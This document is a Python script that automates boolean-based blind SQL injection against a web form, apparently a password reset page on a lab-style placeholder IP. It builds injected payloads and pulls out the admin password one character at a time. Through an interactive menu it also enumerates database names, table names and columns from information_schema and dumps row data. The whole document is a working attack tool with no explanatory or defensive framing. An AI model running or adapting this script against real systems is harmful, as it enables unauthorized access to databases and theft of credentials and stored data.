import requests
import urllib.parse
import string
from colorama import Fore
import sys

# Change This
base_url = 'http://10.10.10.10'
# Change this
base_payload = 'username=admin'

all_alphanumeric = list(string.ascii_letters + string.digits)
special_chars = [
    '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/',
    ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|',
    '}', '~'
]
complete_set = all_alphanumeric + special_chars

# Start Session
s = requests.Session()
r = s.get(base_url)

# Make request with appropriate body
def request(body):
	url_body = base_payload + urllib.parse.quote(body)

	response = s.post(
	        base_url,
	        data=url_body,
	        headers={"Content-Type": "application/x-www-form-urlencoded"},
	        allow_redirects=True
	    )
	if "Successfully sent password reset request!" in response.text:
		return True
	
# Dump password
def dump_password():
	password_list = []
	for i in range(1000):
		for c in complete_set:
			ret = request(f"' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username = 'admin') = '{c}'-- -")
			if ret:
				password_list.append(c)
				password = ''.join(password_list)
				print(password)
				break

# Dump the names of the databases
def dump_databases_names():

    # Find the number of databases
	number_of_databases = 1
	for i in range(50):
		ret = request(f"' AND (SELECT COUNT(*) FROM information_schema.schemata) = {i}-- -")
		if ret:
			number_of_databases = i
			print(Fore.RESET + "Number of Databases: " + Fore.RED + str(number_of_databases))
			break
	
	databases = []
	# Find the names
	for i in range(number_of_databases):
		database_name = []
		for l in range(1, 500):
			# Semaphore to continue to next database
			stop_loops = False
			for c in complete_set:
				ret = request(f"' AND SUBSTRING((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET {i}), {l}, 1) = '{c}'-- -")
				if ret:
					database_name.append(c)
					break

				if c == '~':
					# Set variable in order to move to next database
					stop_loops = True
					print(Fore.RESET + "Found Database: " + Fore.GREEN + ''.join(database_name))
					databases.append(''.join(database_name))
			
			if stop_loops:
				break

	print(Fore.RESET + "Databases Names: " + Fore.RED + ','.join(databases))

# Dump tables of database
def dump_tables(database_name):

    # Find number of tables present on the database
	number_of_tables = 1
	for i in range(100):
		ret = request(f"'AND (SELECT COUNT(*) AS TOTAL_NUMBER_OF_TABLES FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{database_name}') = {i} -- -")
		if ret:
			number_of_tables = i
			print(Fore.RESET + "Number of Tables: " + Fore.RED + str(number_of_tables))
			break
	
	tables = []
	for i in range(number_of_tables):
		table_name = []
		for l in range(1, 500):
			# Semaphore to continue to next database
			stop_loops = False
			for c in complete_set:
				ret = request(f"' AND SUBSTRING((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{database_name}' LIMIT 1 OFFSET {i}), {l}, 1) = '{c}'-- -")
				if ret:
					table_name.append(c)
					break

				if c == '~':
					# Set variable in order to move to next database
					stop_loops = True
					print(Fore.RESET + "Found Table: " + Fore.GREEN + ''.join(table_name))
					tables.append(''.join(table_name))
			
			if stop_loops:
				break
	print(Fore.RESET + "Tables Names: " + Fore.RED + ','.join(tables) + Fore.RESET)

# Dump columns of table
def dump_columns(table_name):

    # Find number of columns in a table
	number_of_columns = 1
	for i in range(100):
		ret = request(f"'AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_name}') = {i}-- -")
		if ret:
			number_of_columns = i
			print(Fore.RESET + "Number of Columns: " + Fore.RED + str(number_of_columns) + Fore.RESET)
			break
	
    # Find the names of the columns
	columns = []
	for i in range(number_of_columns):
		column_name = []
		for l in range(1, 500):
			# Semaphore to continue to next database
			stop_loops = False
			for c in complete_set:
				ret = request(f"' AND SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_name}' LIMIT 1 OFFSET {i}), {l}, 1) = '{c}'-- -")
				if ret:
					column_name.append(c)
					break

				if c == '~':
					# Set variable in order to move to next database
					stop_loops = True
					print(Fore.RESET + "Found Column: " + Fore.GREEN + ''.join(column_name))
					columns.append(''.join(column_name))
			
			if stop_loops:
				break
	print(Fore.RESET + "Columns Names: " + Fore.RED + ','.join(columns) + Fore.RESET)

# Dump data of column
def dump_data(database_name,table_name,column_name):

    # Find number of rows
	number_of_rows = 1
	for i in range(100):
		ret = request(f"'AND (SELECT COUNT(*) FROM {database_name}.{table_name}) = {i}-- -")
		if ret:
			number_of_entries = i
			print(Fore.RESET + "Number of Entries: " + Fore.RED + str(number_of_entries))
			break
	
    # Dump the contents of the table
	entries = []
	for i in range(number_of_entries):
		entry = []
		for l in range(1, 500):
			# Semaphore to continue to next database
			stop_loops = False
			for c in complete_set:
				ret = request(f"' AND SUBSTRING((SELECT {column_name} FROM {database_name}.{table_name} LIMIT 1 OFFSET {i}), {l}, 1) = '{c}'-- -")
				if ret:
					entry.append(c)
					break

				if c == '~':
					# Set variable in order to move to next database
					stop_loops = True
					print(Fore.RESET + "Found Entry: " + Fore.GREEN + ''.join(entry))
					entries.append(''.join(entry))
			
			if stop_loops:
				break
	print(Fore.RESET + "Entries: " + Fore.RED + ','.join(entries) + Fore.RESET)

def menu():
	print("Main Menu:")
	print("1. Retrieve Database Names")
	print("2. Retrieve Table Names of Database")
	print("3. Retrieve Columns from Table")
	print("4. Retrieve Data")
	print("5. Exit")

	def databases():
		print(Fore.MAGENTA + "Retrieving Databases Names")
		print('--------------------------')
		print()

		dump_databases_names()

	def tables():
		print(Fore.MAGENTA + "Retrieving Tables")
		print('-----------------')
		print()

		# Prompt user to select Database to retrieve
		print(Fore.RESET + "Enter Database Name: ")
		database_to_retrieve = input(Fore.RED)
		dump_tables(database_to_retrieve)

	def columns():
		print(Fore.MAGENTA + "Retrieving Columns")
		print('------------------')
		print()

		# Promt user to Select Table to retrieve
		print(Fore.RESET + "Enter Table Name to retrieve: ")
		table_to_retrieve = input(Fore.RED)
		dump_columns(table_to_retrieve)

	def data():
		print(Fore.MAGENTA + "Retrieving Data")
		print('---------------')
		print()

		# Prompt user to select Database to retrieve
		print(Fore.RESET + "Enter Database Name: ")
		database_to_retrieve = input(Fore.RED)

		# Promt user to Select Table to retrieve
		print(Fore.RESET + "Enter Table Name to retrieve: ")
		table_to_retrieve = input(Fore.RED)

		# Promt user to Select Column to retrieve
		print(Fore.RESET + "Enter Column Name to retrieve: ")
		column_to_retrieve = input(Fore.RED)
		dump_data(database_to_retrieve,table_to_retrieve,column_to_retrieve)

	choice = input(Fore.GREEN + "Enter your choice (1-4): " + Fore.RED)
	print(Fore.RESET)

	# Dictionary mapping menu numbers to functions
	menu_options = {
        '1': databases,
        '2': tables,
        '3': columns,
		'4': data,
        '5': lambda: sys.exit("Exiting the program.")
    }

	# Check if the input is valid
	if choice in menu_options:
        # Execute the chosen function
		menu_options[choice]()
	else:
		print("Invalid choice. Please try again.")



def main():
	print('Starting SQL Blind Error Based Injection')
	print('----------------------------------------')
	print()

	# Menu with different options to execute
	while True:	
	
		menu()





if __name__ == "__main__":
    main()